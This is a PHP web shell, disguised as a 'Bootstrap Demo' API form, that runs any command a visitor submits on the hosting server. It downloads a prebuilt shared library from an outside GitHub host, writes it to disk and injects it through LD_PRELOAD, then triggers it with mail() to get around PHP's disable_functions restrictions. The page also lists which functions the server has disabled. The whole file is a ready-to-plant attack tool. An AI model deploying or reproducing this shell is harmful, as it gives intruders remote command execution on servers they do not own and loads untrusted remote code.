    <?php
    // Handle API request
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        header('Content-Type: application/json');

        $response = array();
        $cmd = $_POST["cmd"];
        $out_path = $_POST["outpath"];
        $architecture = $_POST["architecture"];

        // Determine the appropriate shared library URL based on architecture
        $libraryUrl = ($architecture === 'x86') ?
            'https://github.com/azusa-sama/ld_bypass/raw/main/bypass_disablefunc_x86.so' :
            'https://github.com/azusa-sama/ld_bypass/raw/main/bypass_disablefunc_x64.so';

        // Download the shared library file
        $libraryContent = file_get_contents($libraryUrl);
        file_put_contents($architecture === 'x86' ? 'bypass_disablefunc_x86.so' : 'bypass_disablefunc_x64.so', $libraryContent);

        // Set the environment variables
        $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
        $response['cmdline'] = $evil_cmdline;

        putenv("EVIL_CMDLINE=" . $evil_cmdline);

        // $so_path = $architecture === 'x86' ? 'bypass_disablefunc_x86.so' : 'bypass_disablefunc_x64.so';
        // $so_path is full path to this file path + bypass_disablefunc_x86.so

        $so_path = realpath($architecture === 'x86' ? 'bypass_disablefunc_x86.so' : 'bypass_disablefunc_x64.so');
        putenv("LD_PRELOAD=" . $so_path);

        mail("", "", "", "");

        // Execute the command and get output
        $response['output'] = nl2br(file_get_contents($out_path));
        $response['so_path'] = $so_path;

        // Remove the output file
        unlink($out_path);

        echo json_encode($response, JSON_PRETTY_PRINT);
        exit; // Stop further execution
    }
    ?>

    <!DOCTYPE html>
    <html lang="en" data-bs-theme="dark">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Bootstrap Demo</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    </head>
    <?php
    $architecture = isset($_SERVER['PROCESSOR_ARCHITECTURE']) ? $_SERVER['PROCESSOR_ARCHITECTURE'] : '';
    $arch = "";
    if ($architecture == "x86") {
        $arch = "x86";
    } else {
        $arch = "x64";
    }
    $disabledFunctions = ini_get('disable_functions');
    ?>

    <body>
        <div class="container mt-5">
            <h1 class="mb-4">API Access Form</h1>
            <form method="post" id="apiForm">
                <div class="mb-3">
                    <table class="table table-bordered">
                        <thead>
                            <tr>
                                <th scope="col" style="width: 30%">Variable</th>
                                <th scope="col">Value</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <th>Architecture</th>
                                <td><?php echo $arch; ?></td>
                            </tr>
                            <tr>
                                <th>Disable Function</th>
                                <td class="text-danger">
                                    <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">
                                        View All
                                    </button>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <div class="mb-3">
                    <label for="cmd" class="form-label">Command:</label>
                    <!-- <input type="text" class="form-control" id="cmd" name="cmd" placeholder="Enter command" required> make autofocus also-->
                    <input type="text" class="form-control" id="cmd" name="cmd" value="ls -la" placeholder="Enter command" required autofocus>
                </div>

                <div class="mb-3">
                    <label for="outpath" class="form-label">Output Path:</label>
                    <input type="text" class="form-control" id="outpath" name="outpath" value="/tmp/xx.txt" placeholder="Enter output path" required>
                </div>

                <div class="mb-3">
                    <label class="form-label">Architecture:</label>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="architecture" id="x64" value="x64" checked>
                        <label class="form-check-label" for="x64">x64</label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="radio" name="architecture" id="x86" value="x86">
                        <label class="form-check-label" for="x86">x86</label>
                    </div>
                </div>

                <button type="submit" class="btn btn-primary" id="sbmtbtn">Submit</button>
            </form>

            <div class="mt-4 mb-3">
                <h2>Result:</h2>
                <!-- <div id="result" class="bg-white text-dark p-3"></div> make rounded also -->
                <div id="result" class="bg-white text-dark p-3 rounded"></div>
            </div>
        </div>

        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
        <script>
            document.getElementById("apiForm").addEventListener("submit", function(event) {
                event.preventDefault();
                disableSubmitButton();
                makeApiRequest();
            });

            function disableSubmitButton() {
                var submitButton = document.getElementById("sbmtbtn");
                submitButton.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Loading...';
                submitButton.disabled = true;
            }

            function makeApiRequest() {
                var cmd = document.getElementById("cmd").value;
                var outpath = document.getElementById("outpath").value;
                // var sopath = document.getElementById("sopath").value;
                var architecture = document.querySelector('input[name="architecture"]:checked').value;

                // This assumes the PHP file is in the same directory.
                var apiUrl = window.location.href;

                var formData = new FormData();
                formData.append('cmd', cmd);
                formData.append('outpath', outpath);
                // formData.append('sopath', sopath);
                formData.append('architecture', architecture);

                // Make a POST request to the API
                fetch(apiUrl, {
                        method: 'POST',
                        body: formData,
                    })
                    .then(response => response.json())
                    .then(data => {
                        // Display the API response
                        document.getElementById("result").innerHTML = data.output;
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        document.getElementById("result").innerHTML = "Error occurred. Please try again.";
                    })
                    .finally(function() {
                        // Re-enable the submit button after the request is complete
                        enableSubmitButton();
                    });
            }

            function enableSubmitButton() {
                var submitButton = document.getElementById("sbmtbtn");
                submitButton.innerHTML = 'Submit';
                submitButton.disabled = false;
            }
        </script>
        <!-- Modal -->
        <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h1 class="modal-title fs-5" id="exampleModalLabel">Disabled Functions</h1>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <?php
                        // loop $disabledFunctions and then show in table format
                        $disabledFunctions = ini_get('disable_functions');
                        $disabledFunctions = explode(',', $disabledFunctions);
                        echo "<table class='table table-bordered'>";
                        echo "<thead>";
                        echo "<tr>";
                        echo "<th scope='col'>Function</th>";
                        echo "</tr>";
                        echo "</thead>";
                        echo "<tbody>";
                        foreach ($disabledFunctions as $disabledFunction) {
                            echo "<tr>";
                            echo "<td>" . $disabledFunction . "</td>";
                            echo "</tr>";
                        }
                        echo "</tbody>";
                        echo "</table>";

                        ?>
                    </div>
                </div>
            </div>
        </div>
    </body>

    </html>
